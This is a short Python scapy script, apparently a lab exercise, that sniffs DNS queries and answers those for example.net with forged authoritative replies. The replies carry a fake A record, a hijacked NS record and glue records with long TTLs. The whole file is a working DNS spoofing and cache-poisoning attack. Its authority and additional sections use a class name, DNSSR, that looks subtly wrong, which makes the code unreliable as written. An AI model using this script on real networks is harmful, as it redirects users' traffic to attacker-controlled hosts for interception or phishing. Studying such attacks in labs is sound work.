from scapy.all import *


def spoof_dns(pkt):
    if DNS in pkt and b'example.net' in pkt[DNS].qd.qname:
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        AnswerSec = DNSRR(rrname=pkt[DNS].qd.qname,
                          type='A', ttl=99999, rdata='54.84.170.119')
        NameServerSec = DNSSR(rrname='example.net', type='NS',
                              ttl=99999, rdata='nswitcher.example.net')
        AdditionalSec = DNSSR(rrname='nswitcher.example.net',
                              type='A', ttl=99999, rdata='192.168.22.1')
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0,
                     qr=1, qdcount=1, ancount=1, nscount=1, arcount=1,
                     an=AnswerSec, ns=NameServerSec, ar=AdditionalSec)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)


pkt = sniff(filter="udp and dst port 53", prn=spoof_dns)
